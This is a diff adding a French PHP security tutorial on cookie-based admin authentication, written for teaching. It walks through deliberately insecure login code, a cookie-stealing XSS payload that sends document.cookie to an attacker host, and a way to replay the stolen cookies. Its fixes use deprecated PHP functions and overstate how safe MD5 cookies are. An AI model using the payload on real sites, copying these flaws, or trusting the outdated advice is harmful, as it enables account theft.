@@ -1,0 +1,180 @@
+::: Les Cookies ::: 
+Les cookies sont souvent utilisés pour des variables qui doivent être définies sur plusieurs pages du site. Ce système est donc le plus souvent utilisé pour authentifié un utilisateur/admin. C' est principalement de cette utilisation que nous allons parler ici, et des risques que les cookies font encourir.
+
+Un rapide exemple pour comprendre le système des cookies. Imaginons une page Page1.php, avec ce code :
+
+-------------------------------------------------
+<?
+setcookie("blob","Hello World");
+print("<a href="page2.php">Click here</a>");
+?>
+-------------------------------------------------
+
+et une page Page2.php avec ce code :
+
+-------------------------------------------------
+<?
+echo $HTTP_COOKIE_VARS["blob"];
+?>
+-------------------------------------------------
+
+Si un utilisateur se rend sur Page1.php, et clique sur le lien vers Page2.php, il y verra s' afficher"Hello World". On a donc assigné une valeur (Hello World) à une variable ($blob), qui lui sera assignée sur toutes les pages de ce sites jusqu 'à ce que le code php la change (ou un utilisateur, et c' est là un premier danger).
+
+Le problème des cookies est que n' importe qui peut les intercepter à l' aide d' un simple javascript par exemple, ou les envoyer lui-même sur le site. Voyons comment utiliser au mieux les cookies.
+
+Imaginons un script Login.php pour les administrateurs :
+
+---------------------------------------------------
+<?
+include("Config.php");
+
+$pass=$HTTP_POST_VARS["pass"];
+
+if ($pass_admin==$pass){
+setcookie("logged","1");
+}else{
+die("Mauvais mot de passe.");
+}
+
+?> 
+-----------------------------------------------------
+
+Config.php contiendrait dans notre exemple le mot de passe admin dans la variable $pass_admin. Et dans les autres pages réservées aux admins, la ligne :
+
+------------------------------------------------------
+<?
+if (!isset($HTTP_COOKIE_VARS["logged"])) { exit; }
+
+?> 
+------------------------------------------------------
+Ce système n' est pas du tout sécurisé. Pour faire sauter la sécurité et accéder à la partie admin, il suffirait à un hacker d' envoyer un cookie nommé "logged" et avec n' importe quoi dedans (des softs tels HKit permettent de mettre à la portée de tous l' envoi de cookies et la gestion d'headers).
+
+On aurait pu envoyer n' importe quoi depuis login.php dans le cookie, ça serait revenu au même, si le contrôle se limite à la ligne "if (!isset($HTTP_COOKIE_VARS["logged"])) { exit; }".
+
+Voyons une autre possibilité de sécurité, un peu plus avancée. Toujours les mêmes pages, les même variables dans cette exemple.
+Dans Login.php : 
+
+--------------------------------------------------------
+<?
+include("Config.php");
+
+$pass=$HTTP_POST_VARS["pass"];
+if ($pass_admin==$pass)
+{ setcookie("admin","$pass_admin");
+}
+else{ die("Mauvais mot de passe.");
+}
+?>
+----------------------------------------------------------
+
+Et dans les pages réservées aux admins :
+
+----------------------------------------------------------
+<?
+include("Config.php");
+
+$pass=$HTTP_COOKIE_VARS["pass"];
+if ($pass_admin==$pass){print "Partie admin";
+}
+else{ exit;
+}
+?>
+----------------------------------------------------------
+
+Le problème précédent venait du fait qu' on peut envoyer soi-même un cookie, ici c' est le fait qu' on puisse le récupérer qui met la sécurité du système en jeu. Prenons un exemple simple et fréquent pour récupérer le cookie : un javascript, inséré grâce à une faille Cross Site Scripting (voir mon article intitulé "Cross Site Scripting : Compréhension& sécurisation"). Il y a d' autres façons que le javascript, et dans le javascript lui-même il y a plusieurs façons de récupérer un cookie.
+Un exemple commun est :
+
+<script>window.open('http://[attacker]/
+script.php?c='+document.cookie);</script>
+
+Ce script redirige vers http://[attacker]/script.php?c=[LE COOKIE], donc si ce script est exécuté par un admin avec le code PHP que nous avons pris comme exemple, ça donnera une redirection vers l' url : http://[attacker]/script.php?c=admin=[PASS]; Il suffirait à un hacker de coder http://[attacker]script.php de façon à récupérer la valeur de $c, c' est-à-dire le cookie contenant le password admin, pour se logger via login.php sur le site en tant qu' admin.
+
+On pourrait penser qu' il suffit de crypter le password envoyé dans le cookie, pour empêcher le hacker de l' utiliser, de cette façon (Login.php) :
+
+--------------------------------------------------------------
+<?
+include("Config.php");
+
+$pass=$HTTP_POST_VARS["pass"];
+
+if ($pass_admin==$pass){
+setcookie("admin", md5($pass_admin));
+}else{
+die("Mauvais mot de passe.");
+}
+
+?>
+--------------------------------------------------------------
+
+Et par conséquent les pages réservées aux admins :
+
+--------------------------------------------------------------
+<?
+include("Config.php");
+
+$pass=$HTTP_COOKIE_VARS["pass"];
+
+if (md5($pass_admin)==$pass){
+print "Partie admin";
+}else{
+exit;
+}
+?>
+---------------------------------------------------------------
+
+Mais cette modification ne change rien au problème de sécurité de l' exemple d' avant, à partir du moment où on peut toujours récupérer un cookie (ce qui la plupart du temps très simple). Tout ce que ça change, c' est la façon dont le hacker va accéderà la partie admin. Il récupérera toujours le cookie contenant le mot de passe (crypté cette fois), mais au lieu de se logger via login.php, il enverra le password crypté lui-même sur les pages réservées.
+
+Mais... il n'y a donc aucune façon sécurisée de se logger en utilisant les cookies ?
+
+Et bien non, en effet. Sauf si l' ordinateur n' est pas accessible d' une façon ou d' une autre, ou que les admins ne peuvent pas exécuter de script (ce qui réduit les chances d' être sécurisé à 0,000001 %).
+
+La façon la plus sécurisée est la dernière, envoyer le password crypté en md5, d' ailleurs utilisée pas des services comme PHP-Nuke, phpBB ou vBulletin.
+
+Le mieux pour remplacer les cookies est d' utiliser les sessions.
+
+Pour remplacer notre système, par exemple, il faudrait avoir les codes suivants (que je commente) :
+
+Config.php :
+
+---------------------------------------------------------------
+<?
+$pass_admin="5s9P1q7z"; // Password admin
+session_start(); // On lance la session
+?>
+---------------------------------------------------------------
+
+Login.php :
+
+---------------------------------------------------------------
+<?
+include("Config.php"); // On inclut config.php
+
+$pass=$HTTP_POST_VARS["pass"]; // $pass vient d' un formulaire POST
+
+if ($pass_admin==$pass){ // Si le pass envoyé est bien celui de config.php...
+session_register("pass"); // ... on enregistre la session $pass
+}else{ // Sinon,...
+die("Mauvais mot de passe."); // ... on affiche un message d' erreur et on arrête le script.
+}
+
+?>
+---------------------------------------------------------------
+
+Les pages réservées :
+
+---------------------------------------------------------------
+<?
+include("Config.php");
+if (session_is_registered("pass")){ // Si la session $pass a bien été enregistrée...
+print "Partie admin"; // ... on lance la partie admin
+}else{ // Sinon,...
+exit; // ... on stoppe le script.
+}
+?>
+---------------------------------------------------------------
+
+
+
+Credit :
+frog-m@n (leseulfrog@hotmail.com)
+http://www.phpsecure.info 
